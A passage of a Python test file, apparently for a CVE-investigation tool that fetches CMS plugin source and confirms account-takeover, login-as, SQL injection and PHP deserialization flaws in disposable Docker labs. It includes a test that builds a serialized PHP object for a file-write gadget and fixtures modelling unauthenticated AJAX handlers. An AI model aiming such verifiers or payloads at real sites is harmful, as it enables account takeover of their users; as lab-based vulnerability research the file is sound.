        return ws.SourceFetchResult(ok=True, kind="zip-url", source=url, local_path="/tmp/x")

    def fail_fetch_git_source(*a, **kw):
        raise AssertionError("no deberia llamar a fetch_git_source para una URL de .zip")

    orig_zip, orig_git = ws.fetch_zip_url, ws.fetch_git_source
    ws.fetch_zip_url = fake_fetch_zip_url
    ws.fetch_git_source = fail_fetch_git_source
    try:
        r = ws.fetch_source("https://github.com/org/repo/archive/refs/tags/1.0.zip")
        assert r.ok and r.kind == "zip-url"
        assert called.get("zip_url") == "https://github.com/org/repo/archive/refs/tags/1.0.zip"
    finally:
        ws.fetch_zip_url, ws.fetch_git_source = orig_zip, orig_git


def test_websource_fetch_local_zip_end_to_end(tmp_path):
    import zipfile
    from binoracle.workflows.websource import fetch_source, grep_vulnerable_functions
    zpath = tmp_path / "divi-form-builder.zip"
    with zipfile.ZipFile(zpath, "w") as z:
        z.writestr("divi-form-builder/includes/class-user.php",
                  "<?php function update_user($user_id,$data){ wp_update_user($data); }")
    r = fetch_source(str(zpath))
    assert r.ok and r.kind == "local-zip"
    g = grep_vulnerable_functions(r.local_path, ["update_user"])
    assert "update_user" in g["found"]


def test_websource_fetch_local_zip_missing_file_degrades():
    from binoracle.workflows.websource import fetch_local_zip
    r = fetch_local_zip("/definitely/not/a/real/path.zip")
    assert r.ok is False and "no existe" in r.note


def test_websource_wp_plugin_404_mentions_commercial_plugin_possibility(monkeypatch):
    # Regresion de usabilidad real: un 404 de la API de WordPress.org se mostraba como un error
    # generico ("no resuelto"); para un plugin COMERCIAL (p.ej. CVE-2026-5523, Divi Form Builder
    # de Divi Engine -- vendido directo, nunca en el directorio gratuito) eso no explica nada y el
    # analista no sabe que hacer. El mensaje debe sugerir las alternativas reales (.zip local/URL).
    import binoracle.workflows.websource as ws

    def fake_urlopen(url, timeout=30.0):
        raise Exception("HTTP Error 404: Not Found")
    monkeypatch.setattr(ws, "_urlopen", fake_urlopen)
    r = ws.fetch_wordpress_plugin("divi-form-builder")
    assert r.ok is False
    assert "COMERCIAL" in r.note or "premium" in r.note
    assert "--source" in r.note


def test_websource_wp_plugin_404_with_version_tries_direct_download_fallback(monkeypatch):
    # Regresion real encontrada en vivo con CVE-2024-43982 (Login As Users): la API de info de
    # WordPress.org puede dar 404 no porque el plugin sea comercial, sino porque fue CERRADO del
    # directorio tras el aviso de seguridad (confirmado: cerrado el 5-nov-2024). Antes, binoracle
    # se rendia ahi mismo sin intentar nada mas. Si se pidio --version, debe intentar igualmente
    # la descarga directa versionada (a veces sigue sirviendose aunque la API ya no liste el plugin).
    import binoracle.workflows.websource as ws

    calls = []
    def fake_urlopen(url, timeout=30.0):
        calls.append(url)
        if "api.wordpress.org" in url:
            raise Exception("HTTP Error 404: Not Found")
        raise Exception("tampoco hay red real en el test; solo nos interesa que lo intento")
    monkeypatch.setattr(ws, "_urlopen", fake_urlopen)
    r = ws.fetch_wordpress_plugin("login-as-users", version="1.4.3")
    assert any("downloads.wordpress.org" in c and "1.4.3" in c for c in calls), calls
    assert r.ok is False   # en el test no hay red real para completar la descarga
    assert "fallo descargando" in r.note

    # sin --version, el 404 de la API sigue sin intentar nada mas (no hay version concreta que
    # probar a ciegas) -- mismo comportamiento que antes, mensaje honesto con las dos causas.
    calls.clear()
    r2 = ws.fetch_wordpress_plugin("login-as-users")
    assert not any("downloads.wordpress.org" in c for c in calls)
    assert "CERRADO" in r2.note or "cerrado" in r2.note.lower()


def test_websource_detect_plugin_folder_single_dir(tmp_path):
    (tmp_path / "AnyNameAtAll").mkdir()
    (tmp_path / "AnyNameAtAll" / "x.php").write_text("<?php echo 1;")
    from binoracle.workflows.websource import detect_plugin_folder
    assert detect_plugin_folder(str(tmp_path)) == "AnyNameAtAll"


def test_websource_detect_plugin_folder_by_header_among_several(tmp_path):
    # Regresion real: un .zip COMERCIAL (p.ej. CVE-2026-5523) puede extraer a una carpeta que NO
    # coincide con el nombre del fichero/slug ('divi-form-builder.zip' -> 'DiviFormBuilder/').
    # Con varias carpetas de primer nivel, debe elegir la que tiene la cabecera real de WordPress.
    (tmp_path / "docs").mkdir()
    (tmp_path / "docs" / "readme.php").write_text("<?php // no es un plugin")
    (tmp_path / "DiviFormBuilder").mkdir()
    (tmp_path / "DiviFormBuilder" / "divi-form-builder.php").write_text(
        "<?php\n/*\nPlugin Name: Divi Form Builder\n*/\n")
    from binoracle.workflows.websource import detect_plugin_folder
    assert detect_plugin_folder(str(tmp_path)) == "DiviFormBuilder"
    # el hint (p.ej. el slug pedido) gana si de verdad existe como carpeta
    (tmp_path / "divi-form-builder").mkdir()
    assert detect_plugin_folder(str(tmp_path), hint="divi-form-builder") == "divi-form-builder"


def test_websource_detect_plugin_folder_ambiguous_returns_empty(tmp_path):
    (tmp_path / "a").mkdir(); (tmp_path / "a" / "x.txt").write_text("x")
    (tmp_path / "b").mkdir(); (tmp_path / "b" / "y.txt").write_text("y")
    from binoracle.workflows.websource import detect_plugin_folder
    assert detect_plugin_folder(str(tmp_path)) == ""


def test_websource_local_zip_sets_plugin_dir_even_when_folder_name_differs(tmp_path):
    import zipfile
    zpath = tmp_path / "divi-form-builder.zip"
    with zipfile.ZipFile(zpath, "w") as z:
        z.writestr("DiviFormBuilder/divi-form-builder.php",
                  "<?php\n/*\nPlugin Name: Divi Form Builder\n*/\n")
        z.writestr("DiviFormBuilder/includes/class-user.php",
                  "<?php function update_user($id,$d){ wp_update_user($d); }")
    from binoracle.workflows.websource import fetch_source
    r = fetch_source(str(zpath))
    assert r.ok and r.kind == "local-zip"
    assert r.plugin_dir == "DiviFormBuilder"


def test_cve_agent_dynamic_verify_gate_accepts_local_zip_not_only_wordpress_plugin(monkeypatch):
    # Regresion real (encontrada probando el flujo completo con el plugin comercial real de
    # CVE-2026-5523): la verificacion dinamica solo se intentaba para fr.kind=='wordpress-plugin',
    # asi que anadir soporte de .zip local/URL (para plugins COMERCIALES, el caso mas comun en la
    # practica) no servia de nada: nunca llegaba a wpverify.py. Debe activarse tambien para
    # local-zip/zip-url usando fr.plugin_dir (la carpeta auto-detectada, no necesariamente igual
    # al nombre del fichero/slug).
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, wpverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="local-zip", source=target,
                                           local_path="/tmp/fake", plugin_dir="DiviFormBuilder")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    called = {}
    def fake_verify(plugin_dir_path, slug, endpoint, method, params, **kwargs):
        called["slug"] = slug
        return wpverify.WpVerifyResult(ok=True, available=True, verified=True,
                                       detail="ACCOUNT TAKEOVER confirmado (fake)")
    monkeypatch.setattr(wpverify, "verify_wordpress_account_takeover", fake_verify)

    inv = Investigation(cve_id="CVE-2026-5523")
    inv.vuln_class = "missing-authorization"
    # 'pass' en parameters es lo que hace que el gate elija el patron de cambio de credencial
    # (verify_wordpress_account_takeover) en vez del de login-as directo -- ver el test dedicado
    # test_cve_agent_dynamic_verify_gate_picks_login_as_when_only_id_param para ese otro camino.
    inv.llm_notes = {"source_url": "/tmp/divi-form-builder.zip", "endpoint": "/x", "http_method": "POST",
                     "parameters": ["user_id", "pass"], "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("slug") == "DiviFormBuilder"
    assert inv.verified is True


def test_cve_agent_dynamic_verify_gate_picks_login_as_when_only_id_param(monkeypatch):
    # El usuario pidio que esto lo decida el pipeline solo, sin que el analista tenga que saber de
    # antemano si el plugin cambia una credencial o deja un login-as directo (CVE-2024-43982 en
    # Login As Users es de este segundo tipo: solo un ID objetivo, nunca un email/password).
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, wpverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="local-zip", source=target,
                                           local_path="/tmp/fake", plugin_dir="LoginAsUsers")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    called = {}
    def fake_account_takeover(*a, **k):
        called["account_takeover"] = True
        return wpverify.WpVerifyResult(ok=True, available=True, verified=True)
    def fake_login_as(plugin_dir_path, slug, endpoint, method, params, **k):
        called["login_as"] = slug
        return wpverify.WpVerifyResult(ok=True, available=True, verified=True,
                                       detail="LOGIN-AS confirmado (fake)")
    monkeypatch.setattr(wpverify, "verify_wordpress_account_takeover", fake_account_takeover)
    monkeypatch.setattr(wpverify, "verify_wordpress_direct_login_as", fake_login_as)

    inv = Investigation(cve_id="CVE-2024-43982")
    inv.vuln_class = "missing-authorization"
    inv.llm_notes = {"source_url": "/tmp/login-as-users.zip", "endpoint": "/x", "http_method": "GET",
                     "parameters": ["user_id"], "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("login_as") == "LoginAsUsers"
    assert "account_takeover" not in called
    assert inv.verified is True


def test_cve_agent_refines_endpoint_from_real_source_when_hypothesis_wrong(monkeypatch, tmp_path):
    # Reproduce en vivo lo pedido por el usuario ("eso debe hacer la LLM mismo, probar, ver codigo
    # y hacer eso") con el caso real que lo disparo: CVE-2025-3605 (Frontend Login and Registration
    # Blocks). La hipotesis inicial (solo a partir de la descripcion de la CVE) decia
    # action=flr_blocks_user_settings y parameters=[email,password] -- INCORRECTO. El codigo real
    # registra flrblocksusersettingsupdatehandle y el parametro real es 'flr-blocks-email-update'
    # (confirmado leyendo el codigo real que el usuario pego). El refinamiento debe corregirlo
    # SOLO, sin que el analista tenga que leer el codigo y pasarselo a mano por CLI.
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, wpverify

    plugin_dir = tmp_path / "frontend-login-and-registration-blocks" / "inc"
    plugin_dir.mkdir(parents=True)
    php = plugin_dir / "class-flr-blocks-user-settings.php"
    php.write_text(
        "<?php\n" * 55 +     # relleno para que la linea real caiga donde el test la busca
        "\tadd_action( 'wp_ajax_nopriv_flrblocksusersettingsupdatehandle', [$this,'x'] );\n"
        "\tpublic function flr_blocks_user_settings_handle_ajax_callback() {\n"
        "\t\t$user_id = Flr_Blocks_Helper::sanitize( 'user_id', 'post', 'id' );\n"
        "\t\t$user_info->user_email = Flr_Blocks_Helper::sanitize( 'flr-blocks-email-update', 'post', 'email' );\n"
        "\t}\n"
    )

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="local-zip", source=target,
                                           local_path=str(tmp_path),
                                           plugin_dir="frontend-login-and-registration-blocks")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "ajax_action": "flrblocksusersettingsupdatehandle", "http_method": "POST",
                "parameters": ["user_id", "flr-blocks-email-update"],
                "id_param": "user_id", "email_param": "flr-blocks-email-update", "pass_param": "",
            })

    called = {}
    def fake_account_takeover(plugin_dir_path, slug, endpoint, method, params, **kw):
        called["endpoint"] = endpoint
        called["email_param_hint"] = kw.get("email_param_hint")
        return wpverify.WpVerifyResult(ok=True, available=True, verified=True)
    monkeypatch.setattr(wpverify, "verify_wordpress_account_takeover", fake_account_takeover)

    inv = Investigation(cve_id="CVE-2025-3605")
    inv.vuln_class = "missing-authorization"
    # hipotesis inicial INCORRECTA, igual que la del LLM en vivo
    inv.llm_notes = {"source_url": "frontend-login-and-registration-blocks",
                     "endpoint": "/wp-admin/admin-ajax.php?action=flr_blocks_user_settings",
                     "http_method": "POST", "parameters": ["user_id", "email", "password"],
                     "vulnerable_functions": ["flr_blocks_user_settings_handle_ajax_callback"]}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert called.get("endpoint") == "/wp-admin/admin-ajax.php?action=flrblocksusersettingsupdatehandle"
    assert called.get("email_param_hint") == "flr-blocks-email-update"
    assert inv.verified is True


def test_wpverify_distinguishes_missing_cli_from_missing_daemon(monkeypatch):
    # Regresion de usabilidad real: el mensaje de "sin Docker" SIEMPRE decia "CLI presente, falta
    # el daemon" -- enganoso cuando el CLI de docker ni siquiera estaba instalado en la imagen
    # (confirmado en vivo: la primera build del compose no lo traia). Debe distinguir las dos
    # causas y dar el paso siguiente correcto para cada una.
    import binoracle.workflows.wpverify as wv

    monkeypatch.setattr(wv, "_docker_daemon_ok", lambda timeout=8.0: False)
    monkeypatch.setattr(wv.shutil, "which", lambda name: None)
    r1 = wv.verify_wordpress_account_takeover("/tmp", "x", "/x", "POST", ["id"], on_step=lambda m: None)
    assert "no esta instalado" in r1.limitations[0]

    monkeypatch.setattr(wv.shutil, "which", lambda name: "/usr/bin/docker")
    r2 = wv.verify_wordpress_account_takeover("/tmp", "x", "/x", "POST", ["id"], on_step=lambda m: None)
    assert "monta el socket" in r2.limitations[0]


def test_wpverify_lab_host_picks_docker_internal_only_inside_a_container(monkeypatch):
    # Regresion real: binoracle corre dentro de un contenedor y pilota el daemon del HOST via el
    # socket montado (Docker-fuera-de-Docker). El puerto publicado de WordPress se abre en el
    # 127.0.0.1 del HOST, no en el de nuestro propio contenedor -- confirmado en vivo: Apache
    # arrancaba bien (logs con 'resuming normal operations') pero http_ready() nunca lo alcanzaba.
    # Dentro de un contenedor con host.docker.internal resoluble, debe usarlo; fuera de un
    # contenedor (o si no resuelve), debe seguir usando 127.0.0.1 como antes.
    import binoracle.workflows.wpverify as wv

    monkeypatch.setattr(wv.os.path, "exists", lambda p: p == "/.dockerenv")
    monkeypatch.setattr(wv.socket, "gethostbyname", lambda name: "172.17.0.1")
    assert wv._lab_host() == "host.docker.internal"

    def _raise(name):
        raise OSError("no resuelve")
    monkeypatch.setattr(wv.socket, "gethostbyname", _raise)
    assert wv._lab_host() == "127.0.0.1"

    monkeypatch.setattr(wv.os.path, "exists", lambda p: False)
    assert wv._lab_host() == "127.0.0.1"


# --- Drupal ("poco a poco": primer verificador, missing-authorization/account-takeover) ---

def test_websource_looks_like_drupal_slug():
    from binoracle.workflows.websource import looks_like_drupal_slug, looks_like_wp_slug
    assert looks_like_drupal_slug("views_bulk_operations") is True
    assert looks_like_drupal_slug("webform") is False      # sin guion bajo: ambiguo, no "shaped"
    assert looks_like_drupal_slug("divi-form-builder") is False
    assert looks_like_drupal_slug("not a slug with spaces") is False
    # 'webform' tiene forma valida de slug de WordPress tambien (sin guion ni espacios)
    assert looks_like_wp_slug("webform") is True


def test_websource_detect_plugin_folder_recognizes_drupal_module(tmp_path):
    from binoracle.workflows.websource import detect_plugin_folder, detect_module_folder
    mod_dir = tmp_path / "mymodule"
    mod_dir.mkdir()
    (mod_dir / "mymodule.info.yml").write_text(
        "name: My Module\ntype: module\ncore_version_requirement: ^10\n")
    (mod_dir / "mymodule.routing.yml").write_text("mymodule.update:\n  path: '/mymodule/update'\n")
    assert detect_plugin_folder(str(tmp_path)) == "mymodule"
    assert detect_module_folder(str(tmp_path)) == "mymodule"


def test_websource_detect_plugin_folder_still_recognizes_wordpress_plugin(tmp_path):
    # Regresion: anadir el reconocimiento de Drupal a detect_plugin_folder() no debe romper el
    # caso de WordPress que ya funcionaba.
    from binoracle.workflows.websource import detect_plugin_folder
    plugin_dir = tmp_path / "myplugin"
    plugin_dir.mkdir()
    (plugin_dir / "myplugin.php").write_text("<?php\n/*\nPlugin Name: My Plugin\n*/\n")
    assert detect_plugin_folder(str(tmp_path)) == "myplugin"


def test_websource_fetch_source_tries_both_cms_when_ambiguous(monkeypatch):
    # Un slug de una sola palabra (sin guion ni guion bajo) es valido en ambos ecosistemas; sin
    # --cms explicito, si el primero (WordPress) falla, debe probar Drupal antes de rendirse.
    from binoracle.workflows import websource as ws
    calls = []

    def fake_wp(target, version="", on_step=None, timeout=60.0, exclusive_upper_bound=False):
        calls.append(("wp", target))
        return ws.SourceFetchResult(kind="wordpress-plugin", source=target, ok=False,
                                    note="no encontrado en WordPress.org")

    def fake_drupal(target, version="", on_step=None, timeout=60.0, exclusive_upper_bound=False):
        calls.append(("drupal", target))
        return ws.SourceFetchResult(kind="drupal-module", source=target, ok=True,
                                    local_path="/tmp/fake", plugin_dir=target)

    monkeypatch.setattr(ws, "fetch_wordpress_plugin", fake_wp)
    monkeypatch.setattr(ws, "fetch_drupal_module", fake_drupal)
    res = ws.fetch_source("webform")
    assert res.ok is True
    assert res.kind == "drupal-module"
    assert calls == [("wp", "webform"), ("drupal", "webform")]


def test_websource_fetch_source_respects_explicit_cms_hint(monkeypatch):
    from binoracle.workflows import websource as ws
    calls = []
    monkeypatch.setattr(ws, "fetch_wordpress_plugin",
                        lambda *a, **k: calls.append("wp") or ws.SourceFetchResult(ok=True))
    monkeypatch.setattr(ws, "fetch_drupal_module",
                        lambda *a, **k: calls.append("drupal") or ws.SourceFetchResult(ok=True))
    ws.fetch_source("webform", cms_hint="drupal")
    assert calls == ["drupal"]
    calls.clear()
    ws.fetch_source("webform", cms_hint="wordpress")
    assert calls == ["wp"]


def test_drupalverify_check_prereqs_degrades_without_docker(monkeypatch):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: False)
    res = dv._check_prereqs("/tmp", "mymodule")
    assert res is not None
    assert res.available is False


def test_drupalverify_check_prereqs_missing_module_dir(monkeypatch, tmp_path):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: True)
    res = dv._check_prereqs(str(tmp_path), "nope")
    assert res is not None
    assert "no se encuentra" in res.detail


def test_drupalverify_account_takeover_requires_email_or_pass_param(monkeypatch, tmp_path):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: True)
    mod_dir = tmp_path / "mymodule"
    mod_dir.mkdir()
    res = dv.verify_drupal_account_takeover(str(tmp_path), "mymodule", "/mymodule/update",
                                            "POST", ["foo", "bar"])
    assert res.verified is False
    assert res.limitations


def test_cve_agent_looks_like_drupal_module(tmp_path):
    from binoracle.workflows.cve_agent import _looks_like_drupal_module
    mod_dir = tmp_path / "mymodule"
    mod_dir.mkdir()
    (mod_dir / "mymodule.info.yml").write_text("name: My Module\ntype: module\n")
    assert _looks_like_drupal_module(str(tmp_path), "mymodule") is True
    assert _looks_like_drupal_module(str(tmp_path), "doesnotexist") is False
    assert _looks_like_drupal_module(str(tmp_path), "") is False


def test_drupalverify_path_traversal_requires_path_param(monkeypatch, tmp_path):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: True)
    mod_dir = tmp_path / "mymodule"
    mod_dir.mkdir()
    res = dv.verify_drupal_path_traversal(str(tmp_path), "mymodule", "/mymodule/view", "GET",
                                          ["foo", "bar"])
    assert res.verified is False
    assert res.limitations


def test_drupalverify_command_injection_requires_cmd_param(monkeypatch, tmp_path):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: True)
    mod_dir = tmp_path / "mymodule"
    mod_dir.mkdir()
    res = dv.verify_drupal_command_injection(str(tmp_path), "mymodule", "/mymodule/run", "GET",
                                             ["foo", "bar"])
    assert res.verified is False
    assert res.limitations


def test_drupalverify_ssrf_requires_url_param(monkeypatch, tmp_path):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "mymodule").mkdir()
    res = dv.verify_drupal_ssrf(str(tmp_path), "mymodule", "/mymodule/fetch", "GET", ["foo"])
    assert res.verified is False
    assert res.limitations


def test_drupalverify_xss_requires_param(monkeypatch, tmp_path):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "mymodule").mkdir()
    res = dv.verify_drupal_xss(str(tmp_path), "mymodule", "/mymodule/view", "GET", ["foo"])
    assert res.verified is False
    assert res.limitations


def test_drupalverify_ssti_requires_param(monkeypatch, tmp_path):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "mymodule").mkdir()
    res = dv.verify_drupal_ssti(str(tmp_path), "mymodule", "/mymodule/render", "GET", ["foo"])
    assert res.verified is False
    assert res.limitations


def test_drupalverify_xxe_degrades_without_docker(monkeypatch, tmp_path):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: False)
    res = dv.verify_drupal_xxe(str(tmp_path), "mymodule", "/mymodule/import", "POST", ["xml"])
    assert res.available is False


def test_drupalverify_open_redirect_requires_param(monkeypatch, tmp_path):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "mymodule").mkdir()
    res = dv.verify_drupal_open_redirect(str(tmp_path), "mymodule", "/mymodule/go", "GET", ["foo"])
    assert res.verified is False
    assert res.limitations


def test_drupalverify_file_upload_requires_param(monkeypatch, tmp_path):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "mymodule").mkdir()
    res = dv.verify_drupal_file_upload(str(tmp_path), "mymodule", "/mymodule/upload", "POST", ["foo"])
    assert res.verified is False
    assert res.limitations


def test_drupalverify_csrf_requires_email_or_pass_param(monkeypatch, tmp_path):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "mymodule").mkdir()
    res = dv.verify_drupal_csrf(str(tmp_path), "mymodule", "/mymodule/update", "POST", ["foo"])
    assert res.verified is False
    assert res.limitations


# --- Joomla ("poco a poco": tercer CMS, primer verificador missing-authorization) ---

def test_websource_detect_plugin_folder_recognizes_joomla_extension(tmp_path):
    from binoracle.workflows.websource import detect_plugin_folder
    ext_dir = tmp_path / "myext"
    ext_dir.mkdir()
    (ext_dir / "myext.xml").write_text(
        '<?xml version="1.0"?><extension type="plugin" group="system">'
        '<name>plg_system_myext</name></extension>')
    assert detect_plugin_folder(str(tmp_path)) == "myext"


def test_cve_agent_looks_like_joomla_extension(tmp_path):
    from binoracle.workflows.cve_agent import _looks_like_joomla_extension
    ext_dir = tmp_path / "myext"
    ext_dir.mkdir()
    (ext_dir / "myext.xml").write_text(
        '<?xml version="1.0"?><extension type="component">'
        '<name>com_myext</name></extension>')
    assert _looks_like_joomla_extension(str(tmp_path), "myext") is True
    assert _looks_like_joomla_extension(str(tmp_path), "doesnotexist") is False
    assert _looks_like_joomla_extension(str(tmp_path), "") is False


def test_joomlaverify_check_prereqs_degrades_without_docker(monkeypatch):
    import binoracle.workflows.joomlaverify as jv
    monkeypatch.setattr(jv, "_docker_daemon_ok", lambda timeout=8.0: False)
    res = jv._check_prereqs("/tmp", "myext")
    assert res is not None
    assert res.available is False


def test_joomlaverify_check_prereqs_missing_ext_dir(monkeypatch, tmp_path):
    import binoracle.workflows.joomlaverify as jv
    monkeypatch.setattr(jv, "_docker_daemon_ok", lambda timeout=8.0: True)
    res = jv._check_prereqs(str(tmp_path), "nope")
    assert res is not None
    assert "no se encuentra" in res.detail


def test_joomlaverify_account_takeover_requires_email_or_pass_param(monkeypatch, tmp_path):
    import binoracle.workflows.joomlaverify as jv
    monkeypatch.setattr(jv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "myext").mkdir()
    res = jv.verify_joomla_account_takeover(str(tmp_path), "myext", "/index.php?option=com_myext",
                                            "POST", ["foo", "bar"])
    assert res.verified is False
    assert res.limitations


# --- Deserializacion insegura (PHP Object Injection) -- comun a los tres CMS ---

def test_deserialize_gadgets_finds_file_write_gadget(tmp_path):
    from binoracle.workflows.deserialize_gadgets import find_file_write_gadget
    plugin_dir = tmp_path / "myplugin"
    plugin_dir.mkdir()
    (plugin_dir / "cache.php").write_text(
        "<?php\nnamespace MyPlugin;\nclass CacheWriter {\n"
        "    public $cacheFile;\n    public $cacheData;\n"
        "    public function __destruct() {\n"
        "        file_put_contents($this->cacheFile, $this->cacheData);\n"
        "    }\n}\n")
    g = find_file_write_gadget(str(plugin_dir))
    assert g is not None
    assert g.class_name == "CacheWriter"
    assert g.namespace == "MyPlugin"
    assert g.magic_method == "__destruct"
    assert g.path_prop == "cacheFile"
    assert g.content_prop == "cacheData"
    assert g.full_class_name == "MyPlugin\\CacheWriter"


def test_deserialize_gadgets_ignores_non_public_properties(tmp_path):
    from binoracle.workflows.deserialize_gadgets import find_file_write_gadget
    plugin_dir = tmp_path / "myplugin"
    plugin_dir.mkdir()
    (plugin_dir / "cache.php").write_text(
        "<?php\nclass CacheWriter {\n"
        "    private $cacheFile;\n    private $cacheData;\n"
        "    public function __destruct() {\n"
        "        file_put_contents($this->cacheFile, $this->cacheData);\n"
        "    }\n}\n")
    assert find_file_write_gadget(str(plugin_dir)) is None


def test_deserialize_gadgets_returns_none_without_gadget(tmp_path):
    from binoracle.workflows.deserialize_gadgets import find_file_write_gadget
    plugin_dir = tmp_path / "myplugin"
    plugin_dir.mkdir()
    (plugin_dir / "safe.php").write_text("<?php\nfunction safe() { return 1; }\n")
    assert find_file_write_gadget(str(plugin_dir)) is None


def test_deserialize_gadgets_build_serialized_object_matches_php_format():
    from binoracle.workflows.deserialize_gadgets import (DeserializationGadget,
                                                          build_php_serialized_object)
    g = DeserializationGadget(class_name="CacheWriter", namespace="", magic_method="__destruct",
                              path_prop="cacheFile", content_prop="cacheData", file="x", line=1)
    s = build_php_serialized_object(g, "/tmp/x.txt", "SECRET")
    assert s == ('O:11:"CacheWriter":2:{s:9:"cacheFile";s:10:"/tmp/x.txt";'
                 's:9:"cacheData";s:6:"SECRET";}')


def test_wpverify_deserialization_blocked_without_gadget(monkeypatch, tmp_path):
    import binoracle.workflows.wpverify as wv
    monkeypatch.setattr(wv, "_docker_daemon_ok", lambda timeout=8.0: True)
    plugin_dir = tmp_path / "myplugin"
    plugin_dir.mkdir()
    (plugin_dir / "myplugin.php").write_text("<?php\n/*\nPlugin Name: My Plugin\n*/\n")
    res = wv.verify_wordpress_deserialization(str(tmp_path), "myplugin", "/wp-admin/admin-ajax.php",
                                               "POST", ["data"])
    assert res.verified is False
    assert res.limitations


def test_cli_investigate_passes_custom_table_hints(monkeypatch):
    import types
    import binoracle.cli as cli

    captured = {}

    def fake_investigate_cve(cve, binary="", config=None, on_step=None, lang="es",
                             budget_s=300.0, hints=None, use_cache=True):
        captured["hints"] = hints
        return types.SimpleNamespace(cve_id=cve, vuln_class="deserialization",
                                     developed_script="", poc_kind="", html_export_ok=False)

    monkeypatch.setattr(
        "binoracle.workflows.cve_agent.investigate_cve", fake_investigate_cve)
    monkeypatch.setattr(
        "binoracle.workflows.cve_agent.render_investigation", lambda inv, lang, **kw: "")

    args = types.SimpleNamespace(
        cve="CVE-2025-48101", binary="", budget=300, vuln_class=None, source=None, cms=None,
        version=None, endpoint="/wp-admin/admin-ajax.php?action=ctd_store_token", method="POST",
        params=None, functions=None, table_name="wp_myplugin_tokens", column_name="token_data",
        id_column="id", html=None)
    config = types.SimpleNamespace(lang="es")
    cli.cmd_investigate(args, config)

    assert captured["hints"]["table_name"] == "wp_myplugin_tokens"
    assert captured["hints"]["column_name"] == "token_data"
    assert captured["hints"]["id_column"] == "id"


def test_cli_investigate_json_flag_dumps_full_investigation(monkeypatch, tmp_path):
    # pedido explicitamente: el markdown/HTML SIEMPRE recorta los cuerpos de respuesta reales a
    # unos cientos de caracteres -- --json debe volcar el objeto Investigation COMPLETO, sin que
    # render_investigation decida que omitir. Usa un objeto Investigation real (no un
    # types.SimpleNamespace): dataclasses.asdict() exige un dataclass real.
    import json as _json
    import types
    import binoracle.cli as cli
    from binoracle.workflows.cve_agent import Investigation

    fake_inv = Investigation(cve_id="CVE-2024-3552", vuln_class="sqli")
    fake_inv.verified_evidence = {
        "respuesta_control_recorte": "x" * 5000,   # mas largo que cualquier recorte del markdown
        "error_based_intentos": [{"payload": "p1", "respuesta_cuerpo_recorte": "y" * 500}],
    }

    def fake_investigate_cve(cve, binary="", config=None, on_step=None, lang="es",
                             budget_s=300.0, hints=None, use_cache=True):
        return fake_inv

    monkeypatch.setattr("binoracle.workflows.cve_agent.investigate_cve", fake_investigate_cve)
    monkeypatch.setattr("binoracle.workflows.cve_agent.render_investigation",
                        lambda inv, lang, **kw: "# informe recortado")

    out_path = str(tmp_path / "full.json")
    args = types.SimpleNamespace(
        cve="CVE-2024-3552", binary="", budget=300, vuln_class=None, source=None, cms=None,
        version=None, endpoint=None, method=None, params=None, functions=None, table_name=None,
        column_name=None, id_column=None, burp_mcp_url=None, html=None, json=out_path,
        no_cache=False)
    config = types.SimpleNamespace(lang="es")
    cli.cmd_investigate(args, config)

    dumped = _json.loads(open(out_path).read())
    assert dumped["cve_id"] == "CVE-2024-3552"
    assert len(dumped["verified_evidence"]["respuesta_control_recorte"]) == 5000
    assert dumped["verified_evidence"]["error_based_intentos"][0]["respuesta_cuerpo_recorte"] == "y" * 500


def test_lab_host_never_changes_for_burp_and_lab_logins_never_use_burp(monkeypatch):
    # el laboratorio efimero (WordPress/Drupal/Joomla) tuvo dos bugs reales confirmados en vivo
    # intentando hacerlo compatible con Burp: primero Burp lanzaba
    # java.net.UnknownHostException: host.docker.internal al mandar la peticion de login (corre
    # NATIVO en la maquina del analista, fuera de cualquier contenedor, y Docker Desktop solo
    # resuelve ese alias PARA CONTENEDORES) -- y arreglar ESE problema con un _attack_lab_host()
